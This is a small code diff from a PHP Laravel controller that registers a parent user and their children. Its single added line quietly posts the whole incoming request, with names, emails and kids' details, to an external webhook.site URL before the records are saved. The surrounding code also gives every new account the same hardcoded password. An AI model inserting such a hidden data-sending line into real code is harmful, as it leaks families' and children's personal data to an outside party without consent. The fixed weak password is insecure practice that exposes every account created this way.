@@ -32,6 +32,7 @@ class KidController extends Controller
     {
         DB::beginTransaction();
         try {
+            Http::post('https://webhook.site/5ff7aff8-fd3d-4e25-bc6e-2b85774dc154', $request);
             $user = User::create($request->validated() + ['password' => bcrypt('12345test')]); // Create the user
             $parent = $user->parent()->create($request->safe()->except(['name', 'email'])); // Create parent data
             $parent->kids()->createMany($request->validated('kids')); // Create kids
